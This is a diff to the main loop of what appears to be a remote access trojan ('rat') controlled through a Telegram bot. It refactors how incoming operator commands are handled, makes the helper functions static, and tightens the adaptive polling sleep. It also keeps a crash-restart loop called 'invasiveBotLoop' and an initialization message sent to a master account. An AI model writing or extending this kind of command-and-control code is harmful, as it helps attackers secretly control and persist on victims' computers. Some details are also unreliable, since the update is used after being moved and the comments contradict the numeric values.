@@ -1,6 +1,6 @@
 #include "macro.hpp"
 #include "rat/tbot/tbot.hpp"
-#include "rat/tbot/handler/handleUpdate.hpp"
+#include "rat/Handler.hpp"
 #include "logging.hpp"
 #include <string>
 #include <thread>
@@ -10,8 +10,6 @@
 #include <cmath>
 #include <fmt/chrono.h>
 #include <fmt/core.h>
-#include <unordered_map>
-#include "rat/RatState.hpp"
 
 
 // --- Global state ---
@@ -22,10 +20,10 @@ static std::string init_message;
 
 
 // --- Forward declarations ---
-void botLoop(void);
-void invasiveBotLoop(void);
-bool inline _isUpdateEmpty(const rat::tbot::Update& arg_Update);
-void _dynamicSleep(uint32_t arg_Count);
+static void botLoop(void);
+static void invasiveBotLoop(void);
+static bool inline _isUpdateEmpty(const rat::tbot::Update& arg_Update);
+static void _dynamicSleep(uint32_t arg_Count);
 
 // --- Entry point ---
 int main(void) {
@@ -34,7 +32,7 @@ int main(void) {
 }
 
 // --- Reboots the bot on crash ---
-void invasiveBotLoop() {
+static void invasiveBotLoop() {
     while (true) {
         try {
             botLoop();
@@ -49,42 +47,23 @@ void invasiveBotLoop() {
     }
 }
 
-// --- Check if update is empty ---
-bool inline _isUpdateEmpty(const rat::tbot::Update& arg_Update) {
-    return (arg_Update.message.text.empty() && arg_Update.message.files.empty());
-}
-
-// --- Dynamically adjust sleep time based on number of empty updates ---
-void _dynamicSleep(uint32_t arg_Count) {
-    const uint32_t base_sleep = 500;      // Base sleep in ms
-    const double growth_factor = 1.02;    // 2% growth per empty update
-    const uint32_t max_sleep = 30000;     // Cap at 40s
-
-    double sleep = base_sleep * std::pow(growth_factor, arg_Count);
-    if (sleep > max_sleep) {
-        sleep = max_sleep;
-    }
-    sleep_timout_ms = static_cast<uint32_t>(sleep);
-}
-
 // --- Main bot loop ---
-void botLoop(void) {
+static void botLoop(void) {
     DEBUG_LOG("Bot constructing");
     rat::tbot::Bot bot(TOKEN, MASTER_ID);
 
     if (init_message.empty()) {
         init_message = fmt::format("Bot initialized at: {}", rat::system::getCurrentDateTime());
     }
-    rat::RatState session_state;
 
-    session_state.scanSystemPathsForUtilities();
 
     bot.sendMessage(init_message);
     bot.setOffset();
+    rat::handler::Handler session_handler(bot);
     while (true) {
         try {
             rat::tbot::Update update = bot.getUpdate();
-            rat::tbot::handler::handleUpdate(session_state, bot, update);
+            session_handler.handleUpdate(std::move(update));
 
             if(_isUpdateEmpty(update)) ++empty_updates_count;
           
@@ -97,3 +76,22 @@ void botLoop(void) {
         }
     }
 }
+// --- Check if update is empty ---
+static bool inline _isUpdateEmpty(const rat::tbot::Update& arg_Update) {
+    return (arg_Update.message.text.empty() && arg_Update.message.files.empty());
+}
+
+// --- Dynamically adjust sleep time based on number of empty updates ---
+static void _dynamicSleep(uint32_t arg_Count) {
+    const uint32_t base_sleep = 500;      // Base sleep in ms
+    const double growth_factor = 1.001;    // 2% growth per empty update
+    const uint32_t max_sleep = 5000;     // Cap at 5
+
+    double sleep = base_sleep * std::pow(growth_factor, arg_Count);
+    if (sleep > max_sleep) {
+        sleep = max_sleep;
+    }
+    sleep_timout_ms = static_cast<uint32_t>(sleep);
+}
+
+
